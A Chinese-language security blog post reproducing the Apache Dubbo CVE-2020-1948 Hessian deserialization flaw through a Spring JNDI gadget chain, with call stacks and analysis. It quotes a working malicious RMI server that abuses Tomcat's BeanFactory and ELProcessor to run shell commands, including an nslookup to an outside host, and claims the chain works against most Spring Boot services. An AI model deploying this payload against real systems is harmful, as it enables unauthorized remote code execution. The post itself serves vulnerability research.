<h2 id="CVE-2020-1948实际环境复现"><a href="#CVE-2020-1948实际环境复现" class="headerlink" title="CVE-2020-1948实际环境复现"></a>CVE-2020-1948实际环境复现</h2><h3 id="SpringAbstractBeanFactoryPointcutAdvisor利用"><a href="#SpringAbstractBeanFactoryPointcutAdvisor利用" class="headerlink" title="SpringAbstractBeanFactoryPointcutAdvisor利用"></a>SpringAbstractBeanFactoryPointcutAdvisor利用</h3><p>前面说道Rome这个包在业务上不常用，那开发同事一看，嚯，这个我不用啊，你打不着我，就这吗？一下就让人血压升高了，所以要找找有没有更加广泛的利用方式。<br>在学习这个漏洞的时候有师傅提到过在marshalsec中列举了5个可用的gadget分别是：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Rome</span><br><span class="line">XBean</span><br><span class="line">Resin</span><br><span class="line">SpringPartiallyComparableAdvisorHolder</span><br><span class="line">SpringAbstractBeanFactoryPointcutAdvisor</span><br></pre></td></tr></table></figure>

<p>Rome在之前的复现中已经使用过了，而<code>SpringAbstractBeanFactoryPointcutAdvisor</code>则让人眼前一亮，因为它在Spring-aop依赖包中，也就是说使用了spring就会有这个gadget，利用面一下就扩大了。无巧不成书，在看相关利用的时候发现三梦师傅在GitHub上的一个工具dubbo-exp实现了对<code>SpringAbstractBeanFactoryPointcutAdvisor</code>的利用，赶紧clone下来试试看。<br>设置好参数打一发，ldap payload触发成功。</p>
<p><img src="/images/210302/Image.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B3%5D.png" alt=""></p>
<p>贴一下调用栈：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">202</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">doInContext:<span class="number">155</span>, JndiTemplate$<span class="number">1</span> (org.springframework.jndi)</span><br><span class="line">execute:<span class="number">87</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">152</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">179</span>, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:<span class="number">95</span>, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:<span class="number">218</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:<span class="number">112</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getAdvice:<span class="number">88</span>, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:<span class="number">74</span>, AbstractPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">doReadMap:<span class="number">144</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readMap:<span class="number">125</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2691</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">2260</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readObject:<span class="number">74</span>, Hessian2ObjectInput (com.alibaba.dubbo.common.serialize.support.hessian)</span><br><span class="line">decodeHeartbeatData:<span class="number">395</span>, ExchangeCodec (com.alibaba.dubbo.remoting.exchange.codec)</span><br><span class="line">decodeBody:<span class="number">119</span>, DubboCodec (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:<span class="number">120</span>, ExchangeCodec (com.alibaba.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:<span class="number">81</span>, ExchangeCodec (com.alibaba.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:<span class="number">44</span>, DubboCountCodec (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">messageReceived:<span class="number">133</span>, NettyCodecAdapter$InternalDecoder (com.alibaba.dubbo.remoting.transport.netty)</span><br><span class="line">handleUpstream:<span class="number">80</span>, SimpleChannelUpstreamHandler (org.jboss.netty.channel)</span><br><span class="line">sendUpstream:<span class="number">564</span>, DefaultChannelPipeline (org.jboss.netty.channel)</span><br><span class="line">sendUpstream:<span class="number">559</span>, DefaultChannelPipeline (org.jboss.netty.channel)</span><br><span class="line">fireMessageReceived:<span class="number">274</span>, Channels (org.jboss.netty.channel)</span><br><span class="line">fireMessageReceived:<span class="number">261</span>, Channels (org.jboss.netty.channel)</span><br><span class="line">read:<span class="number">349</span>, NioWorker (org.jboss.netty.channel.socket.nio)</span><br><span class="line">processSelectedKeys:<span class="number">280</span>, NioWorker (org.jboss.netty.channel.socket.nio)</span><br><span class="line">run:<span class="number">200</span>, NioWorker (org.jboss.netty.channel.socket.nio)</span><br><span class="line">run:<span class="number">108</span>, ThreadRenamingRunnable (org.jboss.netty.util)</span><br><span class="line">run:<span class="number">44</span>, DeadLockProofWorker$<span class="number">1</span> (org.jboss.netty.util.internal)</span><br><span class="line">runWorker:<span class="number">1142</span>, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:<span class="number">617</span>, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>这里我将Java JDNI的几步调用也粘过来，主要是因为spring是直接调用了JRE（JDK）的JNDI，这样子可以更加明显地看到<code>ldapURLContext.lookup</code>这一步。这里主要的调用链是：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lookup:<span class="number">95</span>, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:<span class="number">218</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:<span class="number">112</span>, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getAdvice:<span class="number">88</span>, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:<span class="number">74</span>, AbstractPointcutAdvisor</span><br></pre></td></tr></table></figure>

<p>其他的部分和Rome依赖是一样的，所以我们着重看一下不同的这一部分。在查看利用链前我们先看一下三梦师傅的利用exp。</p>
<p><img src="/images/210302/Image%20%5B35%5D.png" alt=""></p>
<p>入口的前几部主要是读取命令行的属性进行设置，因为我们主要关注对<code>SpringAbstractBeanFactoryPointcutAdvisor</code>的利用，所以其他的就暂时忽略了，在设置属性后，我们主要关注<code>serialization.makeData</code>。</p>
<p><img src="/images/210302/Image%20%5B36%5D.png" alt=""></p>
<p>此处对输出流进行了初始化，随后调用<code>payload.getPayload</code>获取payload，这里的<code>payload</code>对象是<code>SpringAbstractBeanFactoryPointcutAdvisorPoc</code>实例。</p>
<p><img src="/images/210302/Image%20%5B37%5D.png" alt=""></p>
<p>构造待序列化的对象，<code>SpringUtil.makeJNDITrigger</code>中构造JNDI 触发点<code>SimpleJndiBeanFactory</code>与<code>JndiTemplate</code>，<code>SpringUtil.makeBeanFactoryTriggerBFPA</code>中构造<code>DefaultBeanFactoryPointcutAdvisor</code>并封装入<code>HashMap</code>。<br><code>DefaultBeanFactoryPointcutAdvisor</code>继承自<code>AbstractBeanFactoryPointcutAdvisor</code>。这里的payload构造是三梦师傅根据marshalsec项目改造的，dubbo的hessian经过改造所以payload生成师傅也进行了改造，在marshalsec项目中可以查看其原有构造方式。</p>
<p><img src="/images/210302/Image%20%5B38%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B39%5D.png" alt=""></p>
<p>最后将获取的对象封装入hessian输出中。</p>
<p><img src="/images/210302/Image%20%5B41%5D.png" alt=""></p>
<p>在看过payload构造后，就能更清晰地了解这一利用链路了。简单跟进一下利用链，从<code>putVal</code>开始看。</p>
<p><img src="/images/210302/Image%20%5B20%5D.png" alt=""></p>
<p>在图中语句中调用了<code>key</code>的<code>equals</code>方法而我们传入的<code>DefaultBeanFactoryPointcutAdvisor</code>是继承自<code>AbstractBeanFactoryPointcutAdvisor</code>的，<code>AbstractBeanFactoryPointcutAdvisor</code>的父类<code>AbstractPointcutAdvisor</code>重写了<code>equals</code>方法，这里就进入了构造的payload。</p>
<p><img src="/images/210302/Image%20%5B21%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B22%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B23%5D.png" alt=""></p>
<p>可以看到重写的<code>equals</code>方法调用了<code>getAdvice</code>方法，<code>AbstractBeanFactoryPointcutAdvisor</code>重写了<code>getAdvice</code>。</p>
<p><img src="/images/210302/Image%20%5B24%5D.png" alt=""></p>
<p><code>AbstractBeanFactoryPointcutAdvisor.getAdvice</code>调用<code>getBean</code>，从这里开始进入了spring的JNDI调用流程。</p>
<p><img src="/images/210302/Image%20%5B25%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B26%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B27%5D.png" alt=""></p>
<p>最终spring调用了<code>InitialContext.lookup (javax.naming)</code>触发JNDI注入。</p>
<p><img src="/images/210302/Image%20%5B28%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B29%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B30%5D.png" alt=""></p>
<p><img src="/images/210302/Image%20%5B31%5D.png" alt=""></p>
<p>spring官方对于这个问题认为不是他们的问题，spring只是调用了Java的JNDI，所以这个利用方式到现在的spring-framework也是有效的。<br>到这里我们获得了一枚大炮仗，但是找个符合条件的dubbo扔过去，嗯，哑炮。这是因为虽然spring认为这不是他们造成，但是这个Java官方对这个问题进行了修复，在Java8_191官方增加了白名单，不会从外部地址加载任意类，我尝试的环境使用的是271版本自然就无效了。</p>
<h3 id="武器升级"><a href="#武器升级" class="headerlink" title="武器升级"></a>武器升级</h3><p>炮仗成了哑炮自然让人闹心，必须要升级一下炮仗，其实在三梦师傅程序的注释中有提示，可以通过LDAP返回序列化数据，触发本地Gadget。我尝试了一下确实可用，在本地使用Java8_251成功触发payload，但是这需要目标系统中存在其他反序列化gadget，利用受限，不是我们想要的大炮仗。<br>在<a href="https://www.veracode.com/blog/author/michael-stepankin" target="_blank" rel="noopener">Michael Stepankin</a>的<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a>一文中我们找到了我们想要的答案。<br>在JNDI lookup的链路中， 可以在返回的Reference中指定Factory Class，如果本地CLASSPATH存在就不需要从远程加载，而这个类必须实现 <code>javax.naming.spi.ObjectFactory</code> 接口，并且至少存在一个 <code>getObjectInstance</code>方法，<code>javax.naming.spi.NamingManager</code>中调用这个方法。下图可用看到调用过程。</p>
<p><img src="/images/210305/Image%20%5B3%5D.png" alt=""></p>
<p>这里我们看一下作者给出的payload：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilRMIServerNew</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Creating evil RMI registry on port 1097"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line">        ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>,<span class="string">"org.apache.naming.factory.BeanFactory"</span>,<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">        <span class="comment">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">        ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"</span>));</span><br><span class="line"> </span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> com.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">        registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结合调用看，<code>javax.naming.spi.NamingManager</code>调用<code>factory</code>也就是<code>org.apache.naming.factory.BeanFactory</code>的<code>getObjectInstance</code>方法，这里<code>BeanFactory</code>传入的Reference需要是<code>ResourceRef</code>。<code>org.apache.naming.factory.BeanFactory</code>存在与tomcat依赖环境中，非常普遍。</p>
<p><img src="/images/210305/Image%20%5B4%5D.png" alt=""></p>
<p><img src="/images/210305/Image%20%5B6%5D.png" alt=""></p>
<p>BeanFactory类创建任意bean的实例，并为所有属性调用其setter进行赋值。目标bean类名、属性和属性值都来自引用对象，对象由攻击者控制。而目标类必须有一个无参构造方法，有public的setter方法且参数为一个String类型。作者指出实际上我们可以为任意属性指定任意的setter。于是作者选择了<code>javax.el.ELProcessor</code>作为目标类，这个类在tomcat8+的环境中存在，也是非常普遍。<br>接下来作者用<code>ELProcessor</code>的<code>eval</code>方法执行EL表达式：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">""</span>.getClass().forName(<span class="string">"javax.script.ScriptEngineManager"</span>).newInstance().getEngineByName(<span class="string">"JavaScript"</span>).eval(<span class="string">"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()"</span>)&#125;</span><br></pre></td></tr></table></figure>

<p>这样就达到了任意命令执行的目的，获得一枚威力加强版炮仗。想到这里我不禁嘴角上扬，本地测试，成功。可以看到我的JRE是1.9_251。</p>
<p><img src="/images/210305/Image.png" alt=""></p>
<p><img src="/images/210305/Image%20%5B1%5D.png" alt=""></p>
<p><img src="/images/210305/Image%20%5B2%5D.png" alt=""></p>
<p>由于在高版本的spring-boot中默认的Web中间件就是tomcat8+所以这个组合的利用范围非常地广泛，实测也确实如此，几乎可以通杀绝大部分spring-boot。之后就是愉快地往同事的环境中种一个flag啦（狗头），因为是敏感信息图这里就不放啦。</p>
<hr>
<p>参考链接：</p>
<p><a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html" target="_blank" rel="noopener">https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html</a><br><a href="https://blog.csdn.net/u011721501/article/details/79443598" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/79443598</a><br><a href="https://y4er.com/post/apache-dubbo-cve-2019-17564/" target="_blank" rel="noopener">https://y4er.com/post/apache-dubbo-cve-2019-17564/</a><br><a href="https://my.oschina.net/u/4593034/blog/4418776" target="_blank" rel="noopener">https://my.oschina.net/u/4593034/blog/4418776</a><br><a href="https://l3yx.github.io/2020/08/25/Apache-Dubbo-反序列化漏洞复现笔记/#CVE-2019-17564" target="_blank" rel="noopener">https://l3yx.github.io/2020/08/25/Apache-Dubbo-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/#CVE-2019-17564</a><br><a href="http://www.code2sec.com/cve-2020-1948-dubbo-fan-xu-lie-hua-lou-dong.html" target="_blank" rel="noopener">http://www.code2sec.com/cve-2020-1948-dubbo-fan-xu-lie-hua-lou-dong.html</a><br><a href="https://www.sevenyuan.cn/2020/07/21/java/2020-07-21-dubbo-cve-2020-1948/" target="_blank" rel="noopener">https://www.sevenyuan.cn/2020/07/21/java/2020-07-21-dubbo-cve-2020-1948/</a><br><a href="https://www.anquanke.com/post/id/209251#h3-12" target="_blank" rel="noopener">https://www.anquanke.com/post/id/209251#h3-12</a><br><a href="https://www.freebuf.com/vuls/115849.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/115849.html</a><br><a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">https://xz.aliyun.com/t/6633</a><br><a href="https://threedr3am.github.io/2020/02/14/dubbo%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90-%E9%BB%98%E8%AE%A4dubbo%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E4%B9%8Bhessian2/" target="_blank" rel="noopener">https://threedr3am.github.io/2020/02/14/dubbo%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90-%E9%BB%98%E8%AE%A4dubbo%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E4%B9%8Bhessian2/</a><br><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a><br><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a><br><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/03/05/Dubbo%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E5%86%8D%E7%BB%AD%E4%B8%80%E4%B8%8B/" rel="prev" title="Dubbo漏洞学习-再续一下">
      <i class="fa fa-chevron-left"></i> Dubbo漏洞学习-再续一下
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/07/20/PC%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8F%90%E5%8F%96%E5%AD%A6%E4%B9%A0%E9%9A%8F%E8%AE%B0/" rel="next" title="PC微信小程序提取学习随记">
      PC微信小程序提取学习随记 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-1948基础复现"><span class="nav-number">1.</span> <span class="nav-text">CVE-2020-1948基础复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第二个POC的复现"><span class="nav-number">1.1.</span> <span class="nav-text">第二个POC的复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二个POC的利用链路分析"><span class="nav-number">1.2.</span> <span class="nav-text">第二个POC的利用链路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第一个POC的复现"><span class="nav-number">1.3.</span> <span class="nav-text">第一个POC的复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第一个POC-的利用链路分析"><span class="nav-number">1.4.</span> <span class="nav-text">第一个POC 的利用链路分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2020-1948实际环境复现"><span class="nav-number">2.</span> <span class="nav-text">CVE-2020-1948实际环境复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SpringAbstractBeanFactoryPointcutAdvisor利用"><span class="nav-number">2.1.</span> <span class="nav-text">SpringAbstractBeanFactoryPointcutAdvisor利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#武器升级"><span class="nav-number">2.2.</span> <span class="nav-text">武器升级</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">0xSky</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">0xSky</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
